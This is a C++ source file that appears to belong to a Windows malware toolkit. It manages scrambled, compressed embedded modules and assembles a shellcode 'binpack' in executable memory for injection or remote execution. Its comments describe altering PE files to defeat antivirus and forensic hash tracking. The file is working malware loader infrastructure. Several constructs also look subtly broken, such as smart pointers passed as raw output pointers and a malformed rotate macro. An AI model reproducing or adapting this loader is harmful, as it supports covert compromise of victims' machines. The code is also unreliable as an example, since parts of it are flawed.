/*
    EmbeddedResources.cpp
    Module with embedded resources used by InstallerExe and WorkDispatcherDlls module
    Implements an internal logic for registering binary chunks and searching for a specified binary resource.
    Such logic is essential due to this routine used among different modules, which are executed differently.
    So every starting point init routine should perform it's modules init internally, thus resolving circular dependencies.
*/

#include <windows.h>
#include <vector>
#include <memory>
#include <stdexcept>
#include "dbg.h"
#include "EmbeddedResources.h"

#ifdef ROUTINES_BY_PTR

EmbeddedResources_ptrs EmbeddedResources_apis;  // global var for transparent name translation into call-by-pointer  

// should be called before any other apis used to fill internal structures
VOID EmbeddedResources_resolve(EmbeddedResources_ptrs *apis)
{
#ifdef _DEBUG
    if (IsBadReadPtr(apis, sizeof(EmbeddedResources_ptrs))) { DbgPrint("DBG_ERR: bad read ptr %p len %u", apis, sizeof(EmbeddedResources_ptrs)); }
#endif
    // save to a global var
    EmbeddedResources_apis = *apis;
}

#else 

#include "mem.h"
#include "dbg.h"
#include "CryptoStrings.h"
#include "RandomGen.h"
#include ".\LZ4\lz4.h"
#include "..\Shellcode\shellcode.h"

class EmbeddedResourceManager {
public:
    EmbeddedResourceManager() : bInited(false), dwItemsCount(0) {
        InitializeCriticalSection(&csListAccess);
    }

    ~EmbeddedResourceManager() {
        DeleteCriticalSection(&csListAccess);
    }

    void enterLock() {
        EnterCriticalSection(&csListAccess);
    }

    void leaveLock() {
        LeaveCriticalSection(&csListAccess);
    }

    void addItem(std::unique_ptr<EMBEDDEDRESOURCE_LIST_CHUNK> item) {
        enterLock();
        items.push_back(std::move(item));
        dwItemsCount++;
        leaveLock();
    }

    EMBEDDEDRESOURCE* findChunk(DWORD dwChunkOptions) {
        enterLock();
        for (const auto& item : items) {
            if (item->er.opts.dwChunkOptions == dwChunkOptions) {
                leaveLock();
                return &item->er;
            }
        }
        leaveLock();
        return nullptr;
    }

    std::vector<std::unique_ptr<EMBEDDEDRESOURCE_LIST_CHUNK>>& getItems() {
        return items;
    }

    DWORD getItemsCount() const {
        return dwItemsCount;
    }

private:
    CRITICAL_SECTION csListAccess;
    bool bInited;
    DWORD dwItemsCount;
    std::vector<std::unique_ptr<EMBEDDEDRESOURCE_LIST_CHUNK>> items;
};

EmbeddedResourceManager g_erList;

/*
    Fill passed structure with ptrs to all exported functions
    Used when module compiled as code to provide ptrs to some other child code
*/
VOID EmbeddedResources_imports(EmbeddedResources_ptrs *apis)
{
    apis->fn_erFindChunk = _erFindChunk;
    apis->fn_erEnumFromChunk = _erEnumFromChunk;
    apis->fn_erEnterLock = _erEnterLock;
    apis->fn_erLeaveLock = _erLeaveLock;
    apis->fnerQueryFile = erQueryFile;
    apis->fnerUnpackResourceBuffer = erUnpackResourceBuffer;
    apis->fnerGetStarterBinpackLen = erGetStarterBinpackLen;
    apis->fnerGetStarterBinpack = erGetStarterBinpack;
    apis->fnerGetClearItemLen = erGetClearItemLen;
    apis->fnerRegisterBinaryChunk = erRegisterBinaryChunk;
    apis->fn_erMakeChunkOptions = _erMakeChunkOptions;
    apis->fn_erGetParamsFromOptions = _erGetParamsFromOptions;
    apis->fnerRegisterModules = erRegisterModules;
}

/*
    xor using pre-defined pseudo random sequence
*/
VOID Scramble(LPVOID pData, SIZE_T lLen)
{
    BYTE *p = (BYTE *)pData;
    SIZE_T lCounter = lLen;

    BYTE bCode;

    RndClass rg = { 0 };

    // init rng
    rgNew(&rg);
    rg.rgInitSeed(&rg, MAKE_UINT64(0x14, lLen));

    while (lCounter) {

        bCode = (BYTE)rg.rgGetRnd(&rg, 0, 255);
        *p = *p ^ bCode;

        p++; lCounter--;
    }
}

#define ROTR8(x,r) (x >> r) | (x << (8 - r));
VOID _erEasyDeScramble(LPVOID pData, SIZE_T lLen)
{
    BYTE *p = (BYTE *)pData;
    SIZE_T lCounter = lLen;

    while (lCounter) {
        *p = ROTR8(*p, 2);
        p++; lCounter--;
    }
}

/*
    Performs some minor modifications to PE header (timestamp) and data section (by signature?)
    to avoid constant hashes of file, which may be used later by forensics
*/
VOID _erRandomPEModifications(LPVOID pPE, DWORD dwPELen)
{
    DbgPrint("entered: TO BE IMPLEMENTED!");

    // check if passed file is a valid PE
    // ...

    // check if signature present -> no modifications to prevent from signature tampering
    // ..
}

/*
    Converts separated params into combined EMBEDDEDRESOURCE.dwChunkOptions
    NB: wModuleId should be 0 for all RES_TYPE except RES_TYPE_MODULE 
*/
DWORD _erMakeChunkOptions(RES_TYPE rt, ARCH_TYPE at, WORD wModuleId)
{
    return (DWORD)((wModuleId << 16) + ((BYTE)rt << 8) + (BYTE)at);
}

/*
    Converts from single DWORD into separate params
*/
VOID _erGetParamsFromOptions(DWORD dwChunkOptions, RES_TYPE *rt, ARCH_TYPE *at, WORD *wModuleId)
{
    // check params passed
    if (!rt || !at || !wModuleId || !dwChunkOptions) { DbgPrint("ERR: invalid params passed"); }

    *wModuleId = (WORD)(dwChunkOptions >> 16);
    *rt = (RES_TYPE)((WORD)dwChunkOptions >> 8);
    *at = (ARCH_TYPE)((BYTE)dwChunkOptions);
}

/*
    Queries internal storage for an embedded servicing exe file of a
    specified architecture.
    Allocates buffer internally and stores in passed ptr.
    if bDoFinalDexor specified, final dexor is also removed. It is recommended to keep xoring of data when preparing dll for shellcode attach
    Note: caller should dispose buffer by itself
*/
BOOL erQueryFile(RES_TYPE rt, ARCH_TYPE at, LPVOID *pBuff, DWORD *dwLen, DWORD *pdwExtraParam, BOOL bDoFinalDexor)
{
    BOOL bRes = FALSE;  // func result
    std::unique_ptr<BYTE[]> pInData;  // ptr to input data of embedded resource
    DWORD dwInDataLen = 0;  // ^ len
    EMBEDDEDRESOURCE *er_tmp = nullptr;  // item presented in chunks list, to be accessed only while holding a cs lock
    EMBEDDEDRESOURCE er;                // local copy of non-volatile fields from ^

    if ((!pBuff) || (!dwLen)) { DbgPrint("ERR: invalid input params"); return bRes; }

    // select pInData & dwInDataLen according to request
    g_erList.enterLock();
    __try {
        // try to get ptr according to search params
        er_tmp = g_erList.findChunk(_erMakeChunkOptions(rt, at, 0));

        if (er_tmp) {
            // chunk found, make a local copy of data and non-volatile fields
            er = *er_tmp;  // NB: do not use ptrs from here

            // copy data into local buffer
            dwInDataLen = er.opts.dwChunkLen;
            pInData = std::make_unique<BYTE[]>(dwInDataLen);
            memcpy(pInData.get(), er.pChunk, dwInDataLen);
        }
    } __except (1) { DbgPrint("ERR: exception catched"); }
    g_erList.leaveLock();

    // check if anything found
    if (!pInData) { DbgPrint("ERR: nothing found for passed arch %u rt %u", at, rt); return bRes; }

    // call processing function
    bRes = erUnpackResourceBuffer(&er, pInData.get(), dwInDataLen, pBuff, dwLen, pdwExtraParam, bDoFinalDexor);

    return bRes;
}

/*
    Called by erQueryFile() internally or by other code to process a COPY of packed resource buffer
    er - ptr to a local copy or otherwise protected from changes structure describing resource to be unpacked (used to query some basic params)
    pInData & dwInDataLen - copy of encoded data from resource's record (MODIFIED internally)
*/
BOOL erUnpackResourceBuffer(EMBEDDEDRESOURCE *er, LPVOID pInData, DWORD dwInDataLen, LPVOID *pBuff, DWORD *dwLen, DWORD *pdwExtraParam, BOOL bDoFinalDexor)
{
    BOOL bRes = FALSE;  // func result

    // check if anything found
    if (!pInData || !dwInDataLen) { DbgPrint("ERR: invalid input params"); return bRes; }

    // check if caller need dwExtraParam (shellcode's EP value)
    if (pdwExtraParam) { *pdwExtraParam = er->opts.dwExtra; }

    // do descrambling
    Scramble(pInData, dwInDataLen);

    // alloc output buffer to hold resulting data
    *pBuff = my_alloc(er->opts.dwOrigLen);

    // do decompress
    *dwLen = LZ4_uncompress_unknownOutputSize((CHAR *)pInData, (CHAR *)*pBuff, (int)dwInDataLen, (int)er->opts.dwOrigLen);

    if (*dwLen) { DbgPrint("unpack OK %u bytes of %u, packed len %u", *dwLen, er->opts.dwOrigLen, dwInDataLen); bRes = TRUE; }
    else { DbgPrint("ERR: unpack failed of %u bytes res", er->opts.dwOrigLen); }

    // last step - dexor result, if needed
    if (bDoFinalDexor) {
        _erEasyDeScramble(*pBuff, *dwLen);

        // last essential part for clear PE - do minor modifications to prevent constant file hashes which may be stored by AV or OS itself (Win8+ Amcache.hve)
        // modifications are essential both for header and code part!
        _erRandomPEModifications(*pBuff, *dwLen);
    }  // if dexor asked

    return bRes;
}

/*
    Calculates amount of mem needed to place all the registered modules with descriptors into serialized structure
    used for initial execution

    NB: caller should already hold cs lock when calling this function
*/
DWORD erCalcEmbResourcesPackLen()
{
    DWORD dwRes = 0;  // func result

    // check for items registered
    if (!g_erList.getItemsCount()) { DbgPrint("WARN: empty list"); return 0; }

    // do enum all the items
    for (const auto& item : g_erList.getItems()) {
        // add size with descriptor
        dwRes += item->er.opts.dwOrigLen + sizeof(ER_SERIALIZED_CHUNK_PARAMS);
    }

    return dwRes;
}

/*
    Get total len of binpack with shellcode to be passed to starter (rse, injection or install.exe)
*/
DWORD erGetStarterBinpackLen(ARCH_TYPE at)
{
    return  sizeof(SHELLCODE_CONTEXT) +
            erGetClearItemLen(RES_TYPE_SHELLCODE, at, 0) + 
            erGetClearItemLen(RES_TYPE_IDD, at, 0) +
            erGetClearItemLen(RES_TYPE_WDD, at, 0) +
            erCalcEmbResourcesPackLen();
}

/*
    Returns len of unpacked item from list, according to data in item's params
*/
DWORD erGetClearItemLen(RES_TYPE rt, ARCH_TYPE at, WORD wModuleId)
{
    DWORD dwRes = 0;  // func result
    EMBEDDEDRESOURCE *er = nullptr;  // item presented in chunks list, to be accessed only while holding a cs lock

    g_erList.enterLock();
    __try {
        // try to get ptr according to search params
        er = g_erList.findChunk(_erMakeChunkOptions(rt, at, wModuleId));

        if (er) {
            // save result
            dwRes = er->opts.dwOrigLen;
        }
    } __except (1) { DbgPrint("ERR: exception catched"); }
    g_erList.leaveLock();

    if (!dwRes) { DbgPrint("ERR: no item found for rt %u, at %u", rt, at); }

    return dwRes;
}

/*
    Prepares serialized view of all modules registered internally, to be appended to resulting binpack with starter shellcode
    NB: attempts to enter cs list lock
    format [<ER_SERIALIZED_CHUNK_PARAMS><chunk data>]
*/
BOOL erGetSerializedEmbResources(LPVOID *pResBuffer, DWORD *dwResBufferLen)
{
    BOOL bRes = FALSE;  // func result
    ER_SERIALIZED_CHUNK_PARAMS erChunk;  // chunk header to be put into serialization buffer
    BYTE *pPtr;  // moving ptr to buffer allocated at *pResBuffer

    // check input
    if (!pResBuffer || !dwResBufferLen) { DbgPrint("ERR: invalid input params"); }

    if (!g_erList.getItemsCount()) { DbgPrint("WARN: empty list"); return bRes; }

    // get lock
    g_erList.enterLock();
    __try {
        // alloc resulting buffer - done while holding cs lock to prevent changes
        *dwResBufferLen = erCalcEmbResourcesPackLen();
        *pResBuffer = my_alloc(*dwResBufferLen);
        pPtr = (BYTE *)*pResBuffer;  // set moving ptr

        // do enum of all items
        for (const auto& item : g_erList.getItems()) {
            // process item - fill ER_SERIALIZED_CHUNK_PARAMS
            erChunk = item->er.opts;

            // put into ptr
            memcpy(pPtr, &erChunk, sizeof(ER_SERIALIZED_CHUNK_PARAMS)); pPtr += sizeof(ER_SERIALIZED_CHUNK_PARAMS);
            memcpy(pPtr, item->er.pChunk, item->er.opts.dwChunkLen);  pPtr += item->er.opts.dwChunkLen;
        }

        // all done ok
        bRes = TRUE;
    } __except (1) { DbgPrint("ERR: exception catched"); }
    g_erList.leaveLock();  // free lock

    return bRes;
}

/*
    Prepares a binpack of specified arch(x32/x64) ready to be sent to remote side (RSE) for execution
    Binpack's contents is:
    <shellcode_context><shellcode><idd xored><wdd xored><serialized binpack itself for later parsing>
    execution in shellcode context is started from IDD
    pContextPtr & pExecPtr points to some place at pResBuffer
    NB: this function allocates buffer internally, caller should dispose it using VirtualFree()
*/
BOOL erGetStarterBinpack(ARCH_TYPE at, LPVOID *pResBuffer, DWORD *dwResBufferLen, LPVOID *pContextPtr, LPVOID *pExecPtr)
{
    BOOL bRes = FALSE;  // func result
    SHELLCODE_CONTEXT sc = { 0 };  // structure to be filled and embedded into resulting chunk

    // ptrs to hold decoded IDD & WDD libs
    std::unique_ptr<BYTE[]> pIDD, pWDD, pShellcode, pBuff;
    DWORD dwIDD = 0, dwWDD = 0, dwShellcode = 0, dwBuffLen = 0;

    BYTE *pPtr;  // moving ptr

    // check input params
    if (!at || !pResBuffer || !dwResBufferLen || !pContextPtr || !pExecPtr) { DbgPrint("ERR: invalid input params"); return bRes; }
    if (!g_erList.getItemsCount()) { DbgPrint("WARN: empty list"); return bRes; }

    // alloc mem needed with execution allowed
    *dwResBufferLen = erGetStarterBinpackLen(at);
    *pResBuffer = VirtualAlloc(NULL, *dwResBufferLen, MEM_COMMIT | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    pPtr = (BYTE *)*pResBuffer;

    // enter lock
    g_erList.enterLock();
    __try {
        do {  // not a loop
            // get IDD & WDD needed for correct fill of shellcode context
            if (!erQueryFile(RES_TYPE_IDD, at, (LPVOID*)&pIDD, &dwIDD, NULL, FALSE)) { DbgPrint("ERR: failed to get IDD"); break; }
            if (!erQueryFile(RES_TYPE_WDD, at, (LPVOID*)&pWDD, &dwWDD, NULL, FALSE)) { DbgPrint("ERR: failed to get WDD"); break; }
            if (!erQueryFile(RES_TYPE_SHELLCODE, at, (LPVOID*)&pShellcode, &dwShellcode, &sc.dwShellcodeEntrypointOffset, TRUE)) { DbgPrint("ERR: failed to get shellcode"); break; }

            // fill shellcode context
            // NB: structure: <shellcode><shellcode_context><idd xored><wdd xored><serialized binpack itself for later parsing>
            // all ptrs in shellcode context are relative to the start of context (not the chunk's start)
            sc.dwStructureLen = sizeof(SHELLCODE_CONTEXT);  
            sc.dwShellcodeLen = dwShellcode;
            sc.dwFullChunkLen = *dwResBufferLen;
            // sc.dwShellcodeEntrypointOffset filled at call to erQueryFile()
            *pExecPtr = pPtr + sc.dwShellcodeEntrypointOffset + sc.dwStructureLen;
            
            sc.prelIDD = sizeof(SHELLCODE_CONTEXT) + sc.dwShellcodeLen;
            sc.dwIDDLen = dwIDD;

            sc.prelWDD = sizeof(SHELLCODE_CONTEXT) + sc.dwShellcodeLen + dwIDD;
            sc.dwWDDLen = dwWDD;

            // set dll exec target
            sc.prelExecDll = sc.prelIDD;
            sc.dwExecDllLen = sc.dwIDDLen;

            // copy prepared chunks
            *pContextPtr = pPtr;
            memcpy(pPtr, &sc, sizeof(SHELLCODE_CONTEXT));  pPtr += sizeof(SHELLCODE_CONTEXT);  
            memcpy(pPtr, pShellcode.get(), dwShellcode);  pPtr += dwShellcode;  
            memcpy(pPtr, pIDD.get(), dwIDD);  pPtr += dwIDD;  
            memcpy(pPtr, pWDD.get(), dwWDD);  pPtr += dwWDD;  

            // get serialized binpack
            if (!erGetSerializedEmbResources((LPVOID*)&pBuff, &dwBuffLen)) { DbgPrint("ERR: failed to get binpack"); break; }
            memcpy(pPtr, pBuff.get(), dwBuffLen);

            // all done ok
            bRes = TRUE;
        } while (FALSE);  // not a loop
    } __except (1) { DbgPrint("ERR: exception catched"); }

    // free lock
    g_erList.leaveLock();

    return bRes;
}

/*
    Checks init state and do internal's init if needed
*/
VOID _erCheckInitChunkList()
{
    // check state
    if (g_erList.getItemsCount()) { return; }

    DbgPrint("performing init");
}

/*
    Searches internal list for a chunk with specified options.
    NB: caller should already hold guarding cs
    NB2: caller should not dispose or modify received data, as it is data inside of linked list
*/
EMBEDDEDRESOURCE* _erFindChunk(DWORD dwChunkOptions)
{
    return g_erList.findChunk(dwChunkOptions);
}

/*
    Performs enum of all registered chunks allowing caller to select and parse needed chunks manually.
    Used to detect modules in list and process them
    NB: caller should already hold guarding cs
    NB2: caller should not dispose or modify received data, as it is data inside of linked list.
    Instead, one should do a copy of structure and buffers before any processing

    pItem points to previous result, or NULL to start from beginning

    This function is needed because module don't export global vars to other modules
*/
EMBEDDEDRESOURCE_LIST_CHUNK* _erEnumFromChunk(EMBEDDEDRESOURCE_LIST_CHUNK* pItemIn)
{
    if (!g_erList.getItemsCount()) { DbgPrint("WARN: empty list"); return nullptr; }

    // check if need starting item
    if (!pItemIn) { return g_erList.getItems().front().get(); }

    // return ptr to next item
    auto it = std::find_if(g_erList.getItems().begin(), g_erList.getItems().end(),
        [pItemIn](const std::unique_ptr<EMBEDDEDRESOURCE_LIST_CHUNK>& item) { return item.get() == pItemIn; });

    if (it != g_erList.getItems().end() && ++it != g_erList.getItems().end()) {
        return it->get();
    }

    return nullptr;
}

/*
    Registers a binary data chunk in internal list so other functions may perform search on it
    Searches list for a specified item to be removed
    returns TRUE when a new item was added, FALSE if an existent item was replaced
*/
BOOL erRegisterBinaryChunk(DWORD dwChunkOptions, LPVOID pChunk, DWORD dwChunkLen, DWORD dwOrigChunkLen, DWORD dwChunkExtra)
{
    BOOL bRes = FALSE;  // func result
    BOOL flAddNew = TRUE;  // by default, add a new item. This flag may be changed if search determined an item with same options

    DbgPrint("dwChunkOptions=%08Xh pChunk=%04Xh dwChunkLen=%u dwOrigChunkLen=%u dwChunkExtra=%04Xh", dwChunkOptions, pChunk, dwChunkLen, dwOrigChunkLen, dwChunkExtra);

    // check if internals initialized
    _erCheckInitChunkList();

    // enter lock
    g_erList.enterLock();
    __try {
        do {  // not a loop
            // scan list for an already existent chunk with such dwChunkOptions
            for (const auto& item : g_erList.getItems()) {
                if (item->er.opts.dwChunkOptions == dwChunkOptions) {
                    // got here if we found corresponding data chunk - do replacement
                    DbgPrint("WARN: found existant chunk with opt %04Xh, replacing", dwChunkOptions);
                    item->er.pChunk = std::make_unique<BYTE[]>(dwChunkLen);
                    item->er.opts.dwChunkLen = dwChunkLen;
                    item->er.opts.dwChunkOptions = dwChunkOptions;  // possibly will be essential later
                    item->er.opts.dwOrigLen = dwOrigChunkLen;
                    item->er.opts.dwExtra = dwChunkExtra;
                    memcpy(item->er.pChunk.get(), pChunk, dwChunkLen);

                    // replacement done, no need to add a new item
                    flAddNew = FALSE;
                    break;
                }
            }

            // no item was found, add a new one if permitted
            if (flAddNew) {
                DbgPrint("adding new item of %04Xh opts, %u bytes", dwChunkOptions, dwChunkLen);

                // alloc new chunk
                auto newItem = std::make_unique<EMBEDDEDRESOURCE_LIST_CHUNK>();

                // fill data items
                newItem->er.pChunk = std::make_unique<BYTE[]>(dwChunkLen);
                newItem->er.opts.dwChunkLen = dwChunkLen;
                newItem->er.opts.dwChunkOptions = dwChunkOptions;  // possibly will be essential later
                newItem->er.opts.dwOrigLen = dwOrigChunkLen;
                newItem->er.opts.dwExtra = dwChunkExtra;
                memcpy(newItem->er.pChunk.get(), pChunk, dwChunkLen);

                // link to the list
                g_erList.addItem(std::move(newItem));

                bRes = TRUE;
            }
        } while (FALSE);  // not a loop
    } __except (1) { DbgPrint("ERR: exception catched"); }

    // free lock
    g_erList.leaveLock();

    return bRes;
}

/*
    Register all embedded data chunks according to it's settings in header
*/
VOID erRegisterModules(LPVOID pBinpack)
{
    ER_SERIALIZED_CHUNK_PARAMS* pChunk = (ER_SERIALIZED_CHUNK_PARAMS*)pBinpack;

    DbgPrint("entered");

    while (pChunk->dwChunkLen) {
        // perform registration
        erRegisterBinaryChunk(pChunk->dwChunkOptions,
            (LPVOID)((SIZE_T)pChunk + sizeof(ER_SERIALIZED_CHUNK_PARAMS)),  // ptr to data after heading structure
            pChunk->dwChunkLen,
            pChunk->dwOrigLen,
            pChunk->dwExtra);

        // move ptr to next item
        pChunk = (ER_SERIALIZED_CHUNK_PARAMS*)((SIZE_T)pChunk + pChunk->dwChunkLen + sizeof(ER_SERIALIZED_CHUNK_PARAMS));
    }

    DbgPrint("done");
}

#endif
